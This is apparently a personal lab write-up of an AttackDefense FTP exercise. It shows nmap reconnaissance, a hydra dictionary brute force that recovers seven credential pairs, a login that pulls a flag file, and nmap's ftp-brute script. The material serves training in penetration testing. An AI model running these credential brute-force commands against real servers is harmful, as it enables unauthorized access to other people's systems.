### FTP1
`ris:PriceTag3`  [[Servers and Services#FTP|FTP]]
`ris:Tools` [[Hack2.0/NMAP|NMAP]] [[Hack2.0/hydra|hydra]] [[metasploit]]

1. What is the version of FTP server?
2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
3. Find the password of user “sysadmin” using nmap script.
4. Find seven flags hidden on the server.
[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
4712: eth0@if4713: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.7/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
4715: eth1@if4716: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:8b:d0:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.139.208.2/24 brd 192.139.208.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ping]]

```
root@attackdefense:~# ping -c 5 192.139.208.3
PING 192.139.208.3 (192.139.208.3) 56(84) bytes of data.
64 bytes from 192.139.208.3: icmp_seq=1 ttl=64 time=0.085 ms
64 bytes from 192.139.208.3: icmp_seq=2 ttl=64 time=0.056 ms
64 bytes from 192.139.208.3: icmp_seq=3 ttl=64 time=0.044 ms
64 bytes from 192.139.208.3: icmp_seq=4 ttl=64 time=0.054 ms
64 bytes from 192.139.208.3: icmp_seq=5 ttl=64 time=0.060 ms

--- 192.139.208.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 79ms
rtt min/avg/max/mdev = 0.044/0.059/0.085/0.016 ms
```

[[Hack2.0/NMAP#General Scan|NMAP general scan]]

```
root@attackdefense:~# nmap 192.139.208.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 06:26 UTC
Nmap scan report for target-1 (192.139.208.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:8B:D0:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

[[Hack2.0/NMAP#Service version|NMAP service version]]

```
root@attackdefense:~# nmap -p 21 -sV -O 192.139.208.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 06:26 UTC
Nmap scan report for target-1 (192.139.208.3)
Host is up (0.000045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:8B:D0:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.11 seconds
```

ftp null session check

```
root@attackdefense:~# ftp 192.139.208.3
Connected to 192.139.208.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.139.208.3]
Name (192.139.208.3:root): 
331 Password required for root
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
221 Goodbye.
```

[[Hack2.0/hydra|hydra]]

```
root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.139.208.3 ftp
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-10 06:37:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.139.208.3:21/
[21][ftp] host: 192.139.208.3   login: sysadmin   password: 654321
[21][ftp] host: 192.139.208.3   login: rooty   password: qwerty
[21][ftp] host: 192.139.208.3   login: demo   password: butterfly
[21][ftp] host: 192.139.208.3   login: auditor   password: chocolate
[21][ftp] host: 192.139.208.3   login: anon   password: purple
[21][ftp] host: 192.139.208.3   login: administrator   password: tweety
[21][ftp] host: 192.139.208.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-10 06:38:22
```

ftp login with one of the user

```
root@attackdefense:~# ftp 192.105.93.3
Connected to 192.105.93.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.105.93.3]
Name (192.105.93.3:root): sysadmin
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (165.2644 kB/s)
ftp> bye
221 Goodbye.
root@attackdefense:~# cat secret.txt 
260ca9dd8a4577fc00b7bd5810298076
```

[[Hack2.0/NMAP#Specific script|NMAP brute script]]

```
root@attackdefense:~# echo "sysadmin" > users               
root@attackdefense:~# nmap -p 21 --script ftp-brute --script-args userdb=/root/users 192.105.93.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 08:54 UTC
Nmap scan report for target-1 (192.105.93.3)
Host is up (0.000047s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 23 guesses in 6 seconds, average tps: 3.8
MAC Address: 02:42:C0:69:5D:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
```


